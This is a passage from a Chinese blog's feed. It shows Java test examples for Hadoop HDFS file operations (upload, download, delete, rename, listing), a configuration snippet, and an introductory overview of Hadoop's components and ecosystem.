class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7）执行程序<br>运行时需要配置用户名称</p><p>客户端去操作HDFS时，是有一个用户身份的。默认情况下，HDFS客户端API会从JVM中获取一个参数来作为自己的用户身份：-DHADOOP_USER_NAME=atguigu，atguigu为用户名称。</p><h2 id="6-2-HDFS的API操作"><a href="#6-2-HDFS的API操作" class="headerlink" title="6.2 HDFS的API操作"></a>6.2 HDFS的API操作</h2><h3 id="6-2-1-HDFS文件上传（测试参数优先级）"><a href="#6-2-1-HDFS文件上传（测试参数优先级）" class="headerlink" title="6.2.1 HDFS文件上传（测试参数优先级）"></a>6.2.1 HDFS文件上传（测试参数优先级）</h3><p>1）编写源代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testCopyFromLocalFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException<span class="token punctuation">,</span> URISyntaxException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取文件系统</span>        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"dfs.replication"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileSystem fs <span class="token operator">=</span> FileSystem<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"hdfs://hadoop102:8020"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> configuration<span class="token punctuation">,</span> <span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 上传文件</span>        fs<span class="token punctuation">.</span><span class="token function">copyFromLocalFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"e:/banzhang.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"/banzhang.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 关闭资源</span>        fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>｝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）将hdfs-site.xml拷贝到项目的根目录下</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.replication<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）参数优先级<br>参数优先级排序：（1）客户端代码中设置的值 &gt;（2）ClassPath下的用户自定义配置文件 &gt;（3）然后是服务器的自定义配置(xxx-site.xml) &gt;（4）服务器的默认配置(xxx-default.xml)</p><h3 id="6-2-2-HDFS文件下载"><a href="#6-2-2-HDFS文件下载" class="headerlink" title="6.2.2 HDFS文件下载"></a>6.2.2 HDFS文件下载</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testCopyToLocalFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException<span class="token punctuation">,</span> URISyntaxException<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取文件系统</span>        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileSystem fs <span class="token operator">=</span> FileSystem<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"hdfs://hadoop102:9820"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> configuration<span class="token punctuation">,</span> <span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 执行下载操作</span>        <span class="token comment" spellcheck="true">// boolean delSrc 指是否将原文件删除</span>        <span class="token comment" spellcheck="true">// Path src 指要下载的文件路径</span>        <span class="token comment" spellcheck="true">// Path dst 指将文件下载到的路径</span>        <span class="token comment" spellcheck="true">// boolean useRawLocalFileSystem 是否开启文件校验</span>        fs<span class="token punctuation">.</span><span class="token function">copyToLocalFile</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"/banzhang.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"e:/banhua.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 关闭资源</span>        fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-2-3-HDFS删除文件和目录"><a href="#6-2-3-HDFS删除文件和目录" class="headerlink" title="6.2.3 HDFS删除文件和目录"></a>6.2.3 HDFS删除文件和目录</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testDelete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException<span class="token punctuation">,</span> URISyntaxException<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1 获取文件系统</span>    Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileSystem fs <span class="token operator">=</span> FileSystem<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"hdfs://hadoop102:9820"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> configuration<span class="token punctuation">,</span> <span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 2 执行删除</span>    fs<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"/0508/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 3 关闭资源</span>    fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-2-4-HDFS文件更名和移动"><a href="#6-2-4-HDFS文件更名和移动" class="headerlink" title="6.2.4 HDFS文件更名和移动"></a>6.2.4 HDFS文件更名和移动</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testRename</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException<span class="token punctuation">,</span> URISyntaxException<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1 获取文件系统</span>    Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileSystem fs <span class="token operator">=</span> FileSystem<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"hdfs://hadoop102:9820"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> configuration<span class="token punctuation">,</span> <span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 2 修改文件名称</span>    fs<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"/banzhang.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"/banhua.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 3 关闭资源</span>    fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-2-5-HDFS文件详情查看"><a href="#6-2-5-HDFS文件详情查看" class="headerlink" title="6.2.5 HDFS文件详情查看"></a>6.2.5 HDFS文件详情查看</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//查看文件名称、权限、长度、块信息</span><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testListFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException<span class="token punctuation">,</span> URISyntaxException<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1获取文件系统</span>    Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileSystem fs <span class="token operator">=</span> FileSystem<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"hdfs://hadoop102:9820"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> configuration<span class="token punctuation">,</span> <span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 2 获取文件详情</span>    RemoteIterator<span class="token operator">&lt;</span>LocatedFileStatus<span class="token operator">></span> listFiles <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">listFiles</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>listFiles<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        LocatedFileStatus status <span class="token operator">=</span> listFiles<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 输出详情</span>        <span class="token comment" spellcheck="true">// 文件名称</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>status<span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 长度</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>status<span class="token punctuation">.</span><span class="token function">getLen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 权限</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>status<span class="token punctuation">.</span><span class="token function">getPermission</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 分组</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>status<span class="token punctuation">.</span><span class="token function">getGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取存储的块信息</span>        BlockLocation<span class="token punctuation">[</span><span class="token punctuation">]</span> blockLocations <span class="token operator">=</span> status<span class="token punctuation">.</span><span class="token function">getBlockLocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>BlockLocation blockLocation <span class="token operator">:</span> blockLocations<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 获取块存储的主机节点</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> hosts <span class="token operator">=</span> blockLocation<span class="token punctuation">.</span><span class="token function">getHosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>String host <span class="token operator">:</span> hosts<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------班长的分割线----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 3 关闭资源</span>fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-2-6-HDFS文件和文件夹判断"><a href="#6-2-6-HDFS文件和文件夹判断" class="headerlink" title="6.2.6 HDFS文件和文件夹判断"></a>6.2.6 HDFS文件和文件夹判断</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testListStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException<span class="token punctuation">,</span> URISyntaxException<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1 获取文件配置信息</span>    Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileSystem fs <span class="token operator">=</span> FileSystem<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"hdfs://hadoop102:9820"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> configuration<span class="token punctuation">,</span> <span class="token string">"atguigu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 2 判断是文件还是文件夹</span>    FileStatus<span class="token punctuation">[</span><span class="token punctuation">]</span> listStatus <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">listStatus</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>FileStatus fileStatus <span class="token operator">:</span> listStatus<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 如果是文件</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileStatus<span class="token punctuation">.</span><span class="token function">isFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"f:"</span><span class="token operator">+</span>fileStatus<span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"d:"</span><span class="token operator">+</span>fileStatus<span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 3 关闭资源</span>    fs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/12/bigdata-hdfs1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 教程（一）hadoop介绍</title>
      <link>https://m01ly.github.io/2020/11/12/bigdata-hdfs/</link>
      <guid>https://m01ly.github.io/2020/11/12/bigdata-hdfs/</guid>
      <pubDate>Thu, 12 Nov 2020 07:34:38 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-hadoop是什么"><a href="#1-hadoop是什么" class="headerlink" title="1 hadoop是什么"></a>1 hadoop是什么</h2><p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构。它提供了一个<strong>海量数据存储</strong>和<strong>分析计算</strong>的能力。广义上来说Hadoop这个词代表了Hadoop生态圈。 </p><p>Hadoop的核心是YARN,HDFS和Mapreduce。随着处理任务不同，各种组件相继出现，丰富Hadoop生态圈，目前生态圈结构大致如图所示 。</p><p><img src="/2020/11/12/bigdata-hdfs/1636705530947.png" alt="1636705530947"></p><h2 id="2-Hadoop的特点"><a href="#2-Hadoop的特点" class="headerlink" title="2. Hadoop的特点"></a>2. Hadoop的特点</h2><ul><li>扩容能力（Scalable） 能可靠地（reliably）存储和处理千兆字节（PB）数据</li><li>成本低（Economical） 可以通过普通机器组成的服务器集群来分发以及处理数据。这些服务器几圈总计可以达到千个节点。</li><li>高效率（Efficient） 通过分发数据，hadoop 可以在数据所在的节点上并行的(parallel)处理它们，这使得处理非常快。</li><li>可靠性（Reliable） hadoop 能自动地维护数据的多份副本，并且在任务失败后能自动重新部署(redeploy)计算任务</li></ul><h2 id="3-Hadoop三大发行版本"><a href="#3-Hadoop三大发行版本" class="headerlink" title="3 Hadoop三大发行版本"></a>3 Hadoop三大发行版本</h2><p>Hadoop三大发行版本：Apache、Cloudera、Hortonworks。</p><p>Apache版本最原始（最基础）的版本，对于入门学习最好。</p><p>Cloudera内部集成了很多大数据框架。对应产品CDH。</p><p>Hortonworks文档较好。对应产品HDP。后面被Cloudera收购</p><h2 id="4-Hadoop组成"><a href="#4-Hadoop组成" class="headerlink" title="4 Hadoop组成"></a>4 Hadoop组成</h2><p> Hadoop的核心组件分为：HDFS（分布式文件系统）、MapRuduce（分布式运算编程框架）、YARN（运算资源调度系统） 。</p><p><img src="/2020/11/12/bigdata-hdfs/1636706148747.png" alt="1636706148747"></p><h3 id="4-1-HDFS"><a href="#4-1-HDFS" class="headerlink" title="4.1 HDFS"></a>4.1 HDFS</h3><p>​    整个Hadoop的体系结构主要是通过HDFS（Hadoop分布式文件系统）来实现对分布式存储的底层支持，并通过MR来实现对分布式并行任务处理的程序支持。<strong>HDFS是Hadoop体系中数据存储管理的基础</strong>。</p><p> 一个HDFS集群是由一个NameNode和若干个DataNode组成的。NameNodee存储元数据，作为主服务器，管理文件系统命名空间和客户端对文件的访问操作。DataNode存储数据，DataNode管理存储的数据。HDFS支持文件形式的数据。 </p><p><img src="/2020/11/12/bigdata-hdfs/1636706441346.png" alt="1636706441346"></p><h3 id="4-2-YARN架构"><a href="#4-2-YARN架构" class="headerlink" title="4.2  YARN架构"></a>4.2  YARN架构</h3><p>上面我们说了 Hadoop2.x 中增加了 Yarn(资源调度)，那资源调度是在调度什么呢？在计算机中资源就是CPU和内存，CPU和内存都是有上限的，所以需要分配给更需要的进程来使用。</p><p><img src="/2020/11/12/bigdata-hdfs/1636706565758.png" alt="1636706565758"></p><p>ResourceManager（RM）就是资源管理者，外部的客户端提交作业请求都会先到 ResourceManager（RM），他代表了集群所有的资源，并监控 NodeManager、启动或监控ApplicationMaster。</p><p>NodeManager（NM） 只管理一个节点的资源，处理来自ResourceManager（RM）的命令和来自ApplicationMaster的命令。</p><p>ApplicationMaster（AM）负责数据的切分、为应用程序申请资源分配内部任务和任务的监控容错。当一个任务提交到 ResourceManager（RM）时就会选择一个节点启动一个ApplicationMaster（AM）来负责这个任务的跟进，也就是对这个任务的一个负责人。也就是说有一个作业任务就会有对应的一个ApplicationMaster（AM）来跟进这个作业任务的执行和调度。</p><p>Container 是对资源的一个抽象封装，里面会包含内存、CPU、磁盘、网络等资源，NodeManager（NM） 就是通过打开和关闭 Container 来调度资源的。</p><h3 id="4-3-MapReduce架构概述"><a href="#4-3-MapReduce架构概述" class="headerlink" title="4.3   MapReduce架构概述"></a>4.3   MapReduce架构概述</h3><p> MapReduce是一种编程模型，用于大规模数据集的并行计算，需要将数据分配到大量的机器上计算，每台机器运行一个子计算任务，最后再合并每台机器运算结果并输出。 MapReduce 的思想就是 『分而治之』.</p><p>MapReduce将计算过程分为两个阶段：Map和Reduce</p><p>1）Map阶段并行处理输入数据</p><p>2）Reduce阶段对Map结果进行汇总</p><p><img src="/2020/11/12/bigdata-hdfs/1636706761153.png" alt="1636706761153"></p><h2 id="5-大数据技术生态体系"><a href="#5-大数据技术生态体系" class="headerlink" title="5  大数据技术生态体系"></a>5  大数据技术生态体系</h2><p><img src="/2020/11/12/bigdata-hdfs/1636706809649.png" alt="1636706809649"></p><p>图中涉及的技术名词解释如下：</p><p>1）Sqoop：Sqoop是一款开源的工具，主要用于在Hadoop、Hive与传统的数据库（MySql）间进行数据的传递，可以将一个关系型数据库（例如 ：MySQL，Oracle 等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。</p><p>2）Flume：Flume是一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统，Flume支持在日志系统中定制各类数据发送方，用于收集数据； </p><p>3）Kafka：Kafka是一种高吞吐量的分布式发布订阅消息系统； </p><p>4）Spark：是当前最流行的开源大数据内存计算框架。可以基于Hadoop上存储的大数据进行计算。</p><p>5）Flink：Flink是当前最流行的开源大数据内存计算框架。用于实时计算的场景较多。</p><p>6）Oozie：Oozie是一个管理Hdoop作业（job）的工作流程调度管理系统。</p><p>7）Hbase：HBase是一个分布式的、面向列的开源数据库。HBase不同于一般的关系数据库，它是一个适合于非结构化数据存储的数据库。</p><p>8）Hive：Hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的SQL查询功能，可以将SQL语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。</p><p>9）ZooKeeper：它是一个针对大型分布式系统的可靠协调系统，提供的功能包括：配置维护、名字服务、分布式同步、组服务等。</p><h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p><a href="https://cloud.tencent.com/developer/article/1661405">https://cloud.tencent.com/developer/article/1661405</a></p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/12/bigdata-hdfs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 教程（六）yarn-架构解析</title>
      <link>https://m01ly.github.io/2020/11/12/bigdata-yarn-framework/</link>
      <guid>https://m01ly.github.io/2020/11/12/bigdata-yarn-framework/</guid>
      <pubDate>Thu, 12 Nov 2020 07:17:06 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
